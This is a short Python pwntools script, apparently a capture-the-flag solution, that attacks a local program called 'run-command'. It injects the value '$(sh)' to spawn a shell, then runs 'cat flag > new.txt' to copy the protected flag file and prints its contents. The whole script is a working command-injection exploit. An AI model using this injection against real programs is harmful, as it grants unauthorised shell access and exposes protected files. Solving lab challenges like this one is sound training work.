#!/usr/bin/env python

from pwn import *
import os




p = process("./run-command")


print(p.recv())
p.sendline("$(sh)")
p.sendline("cat flag > new.txt")
print(p.recv(timeout=1))
p.close()

fd = open("new.txt","r")
print(fd.read())
#look in new.txt